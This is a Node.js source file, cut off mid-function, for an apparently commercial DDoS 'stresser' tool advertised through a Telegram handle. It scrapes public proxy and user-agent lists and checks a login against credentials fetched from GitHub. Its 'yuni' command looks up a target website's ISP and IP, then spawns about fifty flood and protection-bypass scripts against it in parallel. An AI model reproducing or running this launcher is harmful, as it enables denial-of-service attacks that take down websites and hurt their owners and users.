const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '5.0.0'
let processList = [];
const Concurrents = '1/1'
const owner = '𝑺𝑻𝑬𝑽𝑬𝑵𝑺𝑻𝑶𝑹𝑬-𝑪2' 
const cyan = '\x1b[96m'
const bold = '\x1b[1m';
const back_putih = '\x1b[48;5;255m';
const teksungu = '\x1b[31m';
const Reset = '\x1b[0m';
const biru = '\x1b[36m'
const hijau = '\x1b[38;2;144;238;144m'
const teks_hitam = '\x1b[30m'; // Teks hitam🕊🪽
const back_biru = '\x1b[44m'; // Latar belakang biru🕊🪽
const back_ungu = '\x1b[45m'; // Latar belakang ungu🕊🪽
const back_biru_ungu = '\x1b[48;2;128;0;255m';
const { parsePhoneNumberFromString, getCountryCallingCode } = require('libphonenumber-js');
const carrier = require('libphonenumber-js/metadata.min.json');  // Pustaka metadata untuk detail negara🕊🪽
const geocoder = require('libphonenumber-js/metadata.min.json'); // Pustaka metadata untuk detail geografi🕊🪽

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
console.clear()
console.log(`
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑶𝒘𝒏𝒆𝒓 𝑻𝒐𝒐𝒍𝒔 @stevenstoree
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣀⣽⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠈⣿⠁⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣋⡇⠀⠀⠀⠀⠀⢀⠟⡄⠀⠀⠀⠀⠀⣾⣯⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⠴⡄⠀⠀⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⡸⠀⢧⠀⠀⠀⠀⠀⢀⣏⠁⠀⠀⠀⠀⠀⠀⣠⣦⡄
⠘⠓⠻⣤⡀⠀⠀⠀⠀⠀⡏⢣⠀⠀⠀⠀⢀⠇⠀⠸⡄⠀⠀⠀⠀⡜⢸⠀⠀⠀⠀⠀⠀⣠⡾⠟⠃
⠀⠀⠀⢣⠙⠦⡀⠀⠀⢠⠃⠈⢇⠀⠀⠀⡞⠀⠀⠀⢣⠀⠀⠀⡼⠁⢸⡄⠀⠀⢀⡴⠊⡞⠀⠀⠀
⠀⠀⠀⠈⡆⠀⠙⢦⠀⠸⠀⠀⠈⢆⠀⢰⠁⠀⠀⠀⠈⣇⠀⡰⠁⠀⠈⣇⠀⡰⠋⠀⢰⠀⠀⠀⠀
⠀⠀⠀⠀⢁⠀⠀⠀⠱⡇⠀⠀⠀⠈⢦⠇⠀⠀⠀⠀⠀⠘⡶⠁⠀⠀⠀⢸⠞⠀⠀⠀⡾⠀⠀⠀⠀
⠀⠀⠀⠀⢸⠀⠀⢀⣀⣀⣀⣤⣤⣤⣴⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⣀⣀⠀⠀⠀⡇⠀${bold}${teksungu}𝑶𝒘𝒏𝒆𝒓 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : 𝑺𝑻𝑬𝑽𝑬𝑵•𝑺𝑻𝑶𝑹𝑬🕊️🪽 ${biru}⠀⠀⠀
⠀⠀⠀⠀⣼⠶⢿⣟⠛⠉⠉⢩⡟⢧⠀⠀⠀⣴⠛⣦⠀⠀⢠⠞⢫⡉⠉⠙⢛⡟⠿⠶⡷⠀${bold}${teksungu}𝑻𝒆𝒍𝒆𝒈𝒓𝒂𝒎 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : t.me/stevenstoree ${biru}⠀⠀
⠀⠀⠀⠀⠹⡄⠸⣽⣃⣀⣀⣈⣿⣯⣤⣤⣤⣬⣾⣥⣤⣤⣬⣷⣯⣀⣀⣀⣻⡼⠀⢰⠃⠀⠀⠀⠀
⠀⠀⠀⠀⢼⠗⠛⠋⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠛⠛⢻⡦⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠑⠒⠒⠂⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠒⠒⠒⠊⠉⠁⠀⠀⠀⠀⠀⠀⠀
${bold}${hijau}⚔️𝑱𝑨𝑵𝑮𝑨𝑵𝑳𝑨𝑯 𝑴𝑬𝑵𝒀𝑬𝑹𝑨𝑯, 𝑯𝑨𝑹𝑼𝑺 𝑺𝑬𝑴𝑨𝑵𝑮𝑨𝑻 𝑲𝑨𝑾𝑨𝑵⚔️${teksungu}⠀⠀⠀⠀⠀⠀⠀⠀⠀
__________________________________________________________________________________________
\x1b[1m
\x1b[31m| \x1b[34m𝑼𝒔𝒆𝒓: \x1b[32m𝑹𝒐𝒐𝒕 \x1b[31m| \x1b[34m𝑽𝒊𝒑: \x1b[32m𝑻𝒓𝒖𝒆 \x1b[31m| \x1b[34m𝑺𝒖𝒑𝒆𝒓𝑽𝑰𝑷: \x1b[32m𝑻𝒓𝒖𝒆
\x1b[31m| \x1b[34m𝑨𝒅𝒎𝒊𝒏:\x1b[32m 𝑺𝑻𝑬𝑽𝑬𝑵•𝑺𝑻𝑶𝑹𝑬🕊️🪽 \x1b[31m| \x1b[34m𝑬𝒙𝒑𝒊𝒓𝒆𝒅:\x1b[32m 999999\x1b[31m | \x1b[34m𝑻𝒊𝒎𝒆 𝑳𝒊𝒎𝒊𝒕: \x1b[32m999999 
\x1b[31m| \x1b[36m𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔 \x1b[31m| \x1b[36mt.me/stevenstoree\x1b[0m
𝑻𝒚𝒑𝒆 ${bold}${hijau}"𝑩𝒐𝒕𝒏𝒆𝒕𝒔𝒓𝒗"${Reset} 𝑭𝒐𝒓 𝑺𝒉𝒐𝒘𝒊𝒏𝒈 𝑨𝒍𝒍 𝑰𝒏𝒇𝒐 𝑺𝒆𝒓𝒗𝒆𝒓 ${bold}${hijau}"𝑴𝒆𝒏𝒖"${Reset}
========================================================================`)}
// [========================================] //
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data🕊️🪽: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data🕊️🪽: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    // Clear the console screen first🕊🪽
    console.clear();
    
    // Display the banner🕊🪽
    console.log(`            
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣀⣽⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠈⣿⠁⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣋⡇⠀⠀⠀⠀⠀⢀⠟⡄⠀⠀⠀⠀⠀⣾⣯⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⠴⡄⠀⠀⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⡸⠀⢧⠀⠀⠀⠀⠀⢀⣏⠁⠀⠀⠀⠀⠀⠀⣠⣦⡄
⠘⠓⠻⣤⡀⠀⠀⠀⠀⠀⡏⢣⠀⠀⠀⠀⢀⠇⠀⠸⡄⠀⠀⠀⠀⡜⢸⠀⠀⠀⠀⠀⠀⣠⡾⠟⠃
⠀⠀⠀⢣⠙⠦⡀⠀⠀⢠⠃⠈⢇⠀⠀⠀⡞⠀⠀⠀⢣⠀⠀⠀⡼⠁⢸⡄⠀⠀⢀⡴⠊⡞⠀⠀⠀
⠀⠀⠀⠈⡆⠀⠙⢦⠀⠸⠀⠀⠈⢆⠀⢰⠁⠀⠀⠀⠈⣇⠀⡰⠁⠀⠈⣇⠀⡰⠋⠀⢰⠀⠀⠀⠀
⠀⠀⠀⠀⢁⠀⠀⠀⠱⡇⠀⠀⠀⠈⢦⠇⠀⠀⠀⠀⠀⠘⡶⠁⠀⠀⠀⢸⠞⠀⠀⠀⡾⠀⠀⠀⠀
⠀⠀⠀⠀⢸⠀⠀⢀⣀⣀⣀⣤⣤⣤⣴⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⣀⣀⠀⠀⠀⡇⠀${bold}${teksungu}𝑶𝒘𝒏𝒆𝒓 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : 𝑺𝑻𝑬𝑽𝑬𝑵•𝑺𝑻𝑶𝑹𝑬🕊️🪽 ${biru}⠀⠀⠀
⠀⠀⠀⠀⣼⠶⢿⣟⠛⠉⠉⢩⡟⢧⠀⠀⠀⣴⠛⣦⠀⠀⢠⠞⢫⡉⠉⠙⢛⡟⠿⠶⡷⠀${bold}${teksungu}𝑻𝒆𝒍𝒆𝒈𝒓𝒂𝒎 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : t.me/stevenstoree ${biru}⠀⠀
⠀⠀⠀⠀⠹⡄⠸⣽⣃⣀⣀⣈⣿⣯⣤⣤⣤⣬⣾⣥⣤⣤⣬⣷⣯⣀⣀⣀⣻⡼⠀⢰⠃⠀⠀⠀⠀
⠀⠀⠀⠀⢼⠗⠛⠋⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠛⠛⢻⡦⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠑⠒⠒⠂⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠒⠒⠒⠊⠉⠁⠀⠀⠀⠀⠀⠀⠀
${bold}${hijau}⚔️𝑱𝑨𝑵𝑮𝑨𝑵𝑳𝑨𝑯 𝑴𝑬𝑵𝒀𝑬𝑹𝑨𝑯, 𝑯𝑨𝑹𝑼𝑺 𝑺𝑬𝑴𝑨𝑵𝑮𝑨𝑻 𝑲𝑨𝑾𝑨𝑵⚔️${teksungu}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
__________________________________________________________________________________________
${back_putih}${teksungu} 𝑺𝒆𝒍𝒂𝒎𝒂𝒕 𝑫𝒂𝒕𝒂𝒏𝒈 𝑫𝒊 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔 𝑫𝒂𝒏 𝑺𝒊𝒍𝒂𝒉𝒌𝒂𝒏 𝑳𝒐𝒈𝒊𝒏${Reset}                                                                               
    `);

    // Fetch the username from the new URL🕊🪽
    const usernameResponse = await fetch('https://raw.githubusercontent.com/D4youXTool/cache/main/sigma.txt');
    const validUsername = await usernameResponse.text(); // Expected to get the username from the text🕊🪽

    // Fetch the password from the new URL🕊🪽
    const passwordResponse = await fetch('https://raw.githubusercontent.com/D4youXTool/cache/main/sigma.txt');
    const validPassword = await passwordResponse.text(); // Expected to get the password from the text🕊🪽

    // Prompt for username🕊🪽
    permen.question(`${back_putih}${teksungu}𝑴𝒂𝒔𝒖𝒌𝒊𝒏 𝑼𝒔𝒆𝒓𝒏𝒂𝒎𝒆 𝑨𝒏𝒅𝒂${Reset}: `, (username) => {
      if (username.trim() === validUsername.trim()) {
        // If username is correct, prompt for password🕊🪽
        permen.question(`${back_putih}${teksungu}𝑴𝒂𝒔𝒖𝒌𝒊𝒏 𝑷𝒂𝒔𝒔𝒘𝒐𝒓𝒅 𝑨𝒏𝒅𝒂${Reset}: `, (password) => {
          if (password.trim() === validPassword.trim()) {
            // Successful login🕊🪽
            console.log(`𝑺𝒖𝒄𝒄𝒆𝒔𝒇𝒖𝒍𝒍𝒚 𝑳𝒐𝒈𝒊𝒏 𝑻𝒐 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔!`);
            console.clear();
            console.log(`𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 ${biru}𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔${Reset} ${hijau}𝑻𝒐𝒐𝒍𝒔${Reset}${version}`);
            sleep(1000); // No need for await if sleep is synchronous🕊🪽
            banner();
            console.log(`𝑻𝒚𝒑𝒆 ${hijau}"𝑴𝒆𝒏𝒖"${Reset} 𝑭𝒐𝒓 𝑺𝒉𝒐𝒘𝒊𝒏𝒈 𝑨𝒍𝒍 𝑰𝒏𝒇𝒐 𝑪𝒐𝒎𝒎𝒂𝒏𝒅𝒔 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔.`);
            sigma();
          } else {
            // Wrong password🕊🪽
            console.log(`𝑴𝒂𝒌𝒂𝒏𝒚𝒂 𝑩𝒖𝒚 𝑻𝒐𝒐𝒍𝒔 𝑫𝒊 @stevenstoree`);
            process.exit(-1);
          }
        });
      } else {
        // Wrong username🕊🪽
        console.log(`𝑴𝒂𝒌𝒂𝒏𝒚𝒂 𝑩𝒖𝒚 𝑻𝒐𝒐𝒍𝒔 𝑫𝒊 @stevenstoree`);
        process.exit(-1);
      }
    });
  } catch (error) {
    console.log(`𝑱𝒂𝒓𝒊𝒏𝒈𝒂𝒏 𝑨𝒏𝒅𝒂 𝑺𝒆𝒅𝒂𝒏𝒈 𝑬𝒓𝒐𝒓 𝑯𝒂𝒓𝒂𝒑 𝑼𝒍𝒂𝒏𝒈 𝑲𝒆𝒎𝒃𝒂𝒍𝒊`);
  }
}
// [========================================] //
async function yuni(args) {
  if (args.length < 3) {
    console.log(`𝑬𝒙𝒂𝒎𝒑𝒍𝒆: Yuni <𝑻𝒂𝒓𝒈𝒆𝒕> <𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏>
Yuni https://website.com 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔
[ ${bold}${hijau}𝑺𝒚𝒔𝒕𝒆𝒎${Reset} ] 𝑶𝒘𝒏𝒆𝒓 𝑻𝒐𝒐𝒍𝒔 @stevenstoree
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣀⣽⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠈⣿⠁⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣟⣋⡇⠀⠀⠀⠀⠀⢀⠟⡄⠀⠀⠀⠀⠀⣾⣯⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⠴⡄⠀⠀⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⡸⠀⢧⠀⠀⠀⠀⠀⢀⣏⠁⠀⠀⠀⠀⠀⠀⣠⣦⡄
⠘⠓⠻⣤⡀⠀⠀⠀⠀⠀⡏⢣⠀⠀⠀⠀⢀⠇⠀⠸⡄⠀⠀⠀⠀⡜⢸⠀⠀⠀⠀⠀⠀⣠⡾⠟⠃
⠀⠀⠀⢣⠙⠦⡀⠀⠀⢠⠃⠈⢇⠀⠀⠀⡞⠀⠀⠀⢣⠀⠀⠀⡼⠁⢸⡄⠀⠀⢀⡴⠊⡞⠀⠀⠀
⠀⠀⠀⠈⡆⠀⠙⢦⠀⠸⠀⠀⠈⢆⠀⢰⠁⠀⠀⠀⠈⣇⠀⡰⠁⠀⠈⣇⠀⡰⠋⠀⢰⠀⠀⠀⠀
⠀⠀⠀⠀⢁⠀⠀⠀⠱⡇⠀⠀⠀⠈⢦⠇⠀⠀⠀⠀⠀⠘⡶⠁⠀⠀⠀⢸⠞⠀⠀⠀⡾⠀⠀⠀⠀
⠀⠀⠀⠀⢸⠀⠀⢀⣀⣀⣀⣤⣤⣤⣴⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⣀⣀⠀⠀⠀⡇⠀${bold}${teksungu}𝑶𝒘𝒏𝒆𝒓 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : 𝑺𝑻𝑬𝑽𝑬𝑵•𝑺𝑻𝑶𝑹𝑬🕊️🪽 ${biru}⠀⠀⠀
⠀⠀⠀⠀⣼⠶⢿⣟⠛⠉⠉⢩⡟⢧⠀⠀⠀⣴⠛⣦⠀⠀⢠⠞⢫⡉⠉⠙⢛⡟⠿⠶⡷⠀${bold}${teksungu}𝑻𝒆𝒍𝒆𝒈𝒓𝒂𝒎 𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀 : t.me/stevenstoree ${biru}⠀⠀
⠀⠀⠀⠀⠹⡄⠸⣽⣃⣀⣀⣈⣿⣯⣤⣤⣤⣬⣾⣥⣤⣤⣬⣷⣯⣀⣀⣀⣻⡼⠀⢰⠃⠀⠀⠀⠀
⠀⠀⠀⠀⢼⠗⠛⠋⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠛⠛⢻⡦⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠑⠒⠒⠂⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠒⠒⠒⠊⠉⠁⠀⠀⠀⠀⠀⠀⠀
${bold}${hijau}⚔️𝑱𝑨𝑵𝑮𝑨𝑵𝑳𝑨𝑯 𝑴𝑬𝑵𝒀𝑬𝑹𝑨𝑯, 𝑯𝑨𝑹𝑼𝑺 𝑺𝑬𝑴𝑨𝑵𝑮𝑨𝑻 𝑲𝑨𝑾𝑨𝑵⚔️${teksungu}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
__________________________________________________________________________________________
\x1b[41m\x1b[41m!\x1b[0m 𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑼𝑪𝑪𝑬𝑺𝑭𝑼𝑳𝑳𝒀 𝑺𝑬𝑵𝑻 𝑻𝑶 𝑾𝑬𝑩𝑺𝑰𝑻𝑬 \x1b[41m\x1b[41m!\x1b[0m

\x1b[1;37m    𝑯𝑶𝑺𝑻🌐   : \x1b[1;35m[\x1b[1m\x1b[36m${target}\x1b[1;35m]
\x1b[1;37m    𝑷𝑶𝑹𝑻🛰️   : \x1b[1;35m[\x1b[1m\x1b[36m${port}\x1b[1;35m]
\x1b[1;37m    𝑻𝑰𝑴𝑬🕒   : \x1b[1;35m[\x1b[1m\x1b[36m${duration}\x1b[1;35m]
\x1b[1;37m    𝑴𝑬𝑻𝑯𝑶𝑫🎭 : \x1b[1;35m[\x1b[1m\x1b[36m𝒀𝑼𝑵𝑰\x1b[1;35m]
\x1b[1;37m    𝑺𝑬𝑵𝑻 𝑩𝒀💻: \x1b[1;35m[\x1b[1m\x1b[36m𝑫𝑨𝑹𝑲𝑺𝑨𝑫𝑩𝑶𝒀-𝑺𝑻𝑹𝑬𝑺𝑺𝑬𝑹 𝑻𝒐𝒐𝒍𝒔\x1b[1;35m]
\x1b[1;37m    𝑰𝑺𝑷♦️    : \x1b[1;35m[\x1b[1m\x1b[36m${result.isp}\x1b[1;35m]
\x1b[1;37m    𝑨𝑺𝑵🛸    : \x1b[1;35m[\x1b[1m\x1b[36m${result.as}\x1b[1;35m]
\x1b[1;37m    𝑰𝑷♾️     : \x1b[1;35m[\x1b[1m\x1b[36m${result.query}\x1b[1;35m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong🕊️🪽`)
    sigma()
}
const tlsv1 = path.join(__dirname, `/lib/cache/tlsv1.js`);
const mabukcinta = path.join(__dirname, `/lib/cache/mabukcinta.js`);
const bypass = path.join(__dirname, `/lib/cache/bypass.js`);
const tls = path.join(__dirname, `/lib/cache/tls.js`);
const chaptcha = path.join(__dirname, `/lib/cache/chaptcha.js`);
const sadv2 = path.join(__dirname, `/lib/cache/sadv2.js`);
const sadv1 = path.join(__dirname, `/lib/cache/sadv1.js`);
const skynet = path.join(__dirname, `/lib/cache/skynet.js`);
const xin = path.join(__dirname, `/lib/cache/xin.js`);
const xyn = path.join(__dirname, `/lib/cache/xyn.js`);
const cookie = path.join(__dirname, `/lib/cache/cookie.js`);
const cfbypass = path.join(__dirname, `/lib/cache/cfbypass.js`);
const black = path.join(__dirname, `/lib/cache/black.js`);
const browser = path.join(__dirname, `/lib/cache/browser.js`);
const kilua = path.join(__dirname, `/lib/cache/kilua.js`);
const imut = path.join(__dirname, `/lib/cache/imut.js`);
const mantan = path.join(__dirname, `/lib/cache/mantan.js`);
const cyn = path.join(__dirname, `/lib/cache/cyn.js`);
const flaybypass = path.join(__dirname, `/lib/cache/flaybypass.js`);
const flayingraw = path.join(__dirname, `/lib/cache/flayingraw.js`);
const ack = path.join(__dirname, `/lib/cache/ack.js`);
const flood = path.join(__dirname, `/lib/cache/flood.js`);
const brow = path.join(__dirname, `/lib/cache/brow.js`);
const astral = path.join(__dirname, `/lib/cache/astral.js`);
const java = path.join(__dirname, `/lib/cache/java.js`);
const cat = path.join(__dirname, `/lib/cache/cat.js`);
const cf = path.join(__dirname, `/lib/cache/cf.js`);
const blast = path.join(__dirname, `/lib/cache/blast.js`);
const boti = path.join(__dirname, `/lib/cache/boti.js`);
const floodv2 = path.join(__dirname, `/lib/cache/floodv2.js`);
const bypassv2 = path.join(__dirname, `/lib/cache/bypassv2.js`);
const yuni = path.join(__dirname, `/lib/cache/yuni.js`);
const gor = path.join(__dirname, `/lib/cache/gor.js`);
const tlsdark = path.join(__dirname, `/lib/cache/tlsdark.js`)
const nightc2 = path.join(__dirname, `/lib/cache/nightc2.js`);
const destroy = path.join(__dirname, `/lib/cache/destroy.js`);
const storm = path.join(__dirname, `/lib/cache/storm.js`);
const strike = path.join(__dirname, `/lib/cache/strike.js`);
const rape = path.join(__dirname, `/lib/cache/rape.js`);
const rapid = path.join(__dirname, `/lib/cache/rapid.js`);
const hand = path.join(__dirname, `/lib/cache/hand.js`);
const hold = path.join(__dirname, `/lib/cache/hold.js`);
const starstls = path.join(__dirname, `/lib/cache/starstls.js`);
const tlsx = path.join(__dirname, `/lib/cache/tlsx.js`);
const uam = path.join(__dirname, `/lib/cache/uam.js`);
const darkforce = path.join(__dirname, `/lib/cache/darkforce.js`);
const badut = path.join(__dirname, `/lib/cache/badut.js`);
const speed = path.join(__dirname, `/lib/cache/speed.js`);
const ciko = path.join(__dirname, `/lib/cache/ciko.js`);
        exec(`node ${tlsv1} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${mabukcinta} ${target} ${duration} 80 10`)
        exec(`node ${bypass} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${tls} ${target} ${duration} 80 10`)
        exec(`node ${chaptcha} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${sadv2} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${sadv1} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${skynet} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${xin} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${xyn} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${cookie} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${cfbypass} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${black} ${target} ${duration} 80 10`)
        exec(`node ${browser} ${target} ${duration} 80 10`)
        exec(`node ${kilua} ${target} ${duration} 80 10 proxy.txt`) 
        exec(`node ${imut} ${target} ${duration} 80 10 proxy.txt`) 
        exec(`node ${mantan} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${cyn} ${target} ${duration} 80 10 proxy.txt`) 
        exec(`node ${flaybypass} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${flayingraw} ${target} ${duration} 80 10`)
        exec(`node ${ack} ${target} ${duration} 80 10 proxy.txt`) 
        exec(`node ${flood} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${brow} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${astral} ${target} ${duration} 80 10`)
        exec(`node ${java} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${cat} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${cf} ${target} ${duration} 80 10`) 
        exec(`node ${blast} ${target} ${duration} 80 10 proxy.txt`) 
        exec(`node ${boti} ${target} ${duration} 80 10 proxy.txt`) 
        exec(`node ${floodv2} ${target} ${duration} 80 10 proxy.txt`) 
        exec(`node ${bypassv2} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${yuni} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${gor} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${tlsdark} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${nightc2} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${destroy} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${storm} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${strike} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${rape} GET ${duration} 10 proxy.txt 80 ${target}`)
        exec(`node ${rapid} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${hand} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${hold} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${starstls} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${tlsx} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${uam} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${darkforce} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${badut} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${speed} ${target} ${duration} 80 10 proxy.txt`)
        exec(`node ${ciko} ${target} ${duration} 80 10 proxy.txt`)
sigma()
};
// [========================================] //
async function flood(args) {
  if (args.length < 3) {
    console.log(`𝑬𝒙𝒂𝒎𝒑𝒍𝒆: Flood <𝑻𝒂𝒓𝒈𝒆𝒕> <𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏>
Flood https://website.com 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
console.clear()
console.log(`
